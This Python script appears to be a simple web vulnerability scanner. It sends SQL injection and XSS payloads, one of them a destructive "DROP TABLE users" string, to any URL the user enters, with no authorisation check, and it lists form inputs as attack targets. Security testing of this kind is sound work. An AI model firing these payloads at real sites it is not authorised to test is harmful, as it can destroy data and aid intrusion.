import requests
from bs4 import BeautifulSoup
import re

sql_injection_payloads = [
    "' OR 1=1 --",
    "' UNION SELECT NULL, NULL --",
    "' DROP TABLE users --"
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>"
]

def check_sql_injection(url, payloads):
    print("\n[+] Checking for SQL Injection vulnerabilities...")
    for payload in payloads:
        response = requests.get(url + payload)
        if "error" in response.text.lower() or "mysql" in response.text.lower():
            print(f"  - Potential SQL Injection vulnerability found with payload: {payload}")
        else:
            print(f"  - No SQL Injection vulnerability found with payload: {payload}")

def check_xss(url, payloads):
    print("\n[+] Checking for Cross-Site Scripting (XSS) vulnerabilities...")
    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"  - Potential XSS vulnerability found with payload: {payload}")
        else:
            print(f"  - No XSS vulnerability found with payload: {payload}")

def find_form_inputs(url):
    print("\n[+] Scanning for form inputs...")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')
    
    if not forms:
        print("  - No forms found on this page.")
    
    for form in forms:
        inputs = form.find_all('input')
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                print(f"  - Form input found: {name} (this may be a target for SQLi or XSS testing)")

def scan(url):
    print(f"\n[-] Starting scan on: {url}\n")

    check_sql_injection(url, sql_injection_payloads)
    
    check_xss(url, xss_payloads)

    find_form_inputs(url)
    
    print("\n[+] Scan completed.")

def main():
    print("=" * 50)
    print("     Welcome to the Web Vulnerability Scanner")
    print("=" * 50)
    
    target_url = input("Enter the URL of the website to scan (e.g., http://example.com): ").strip()
    print("=" * 50)
    
    if target_url:
        scan(target_url)
    else:
        print("[-] Invalid URL. Please provide a valid website URL.")
    print("=" * 50)

if __name__ == "__main__":
    main()
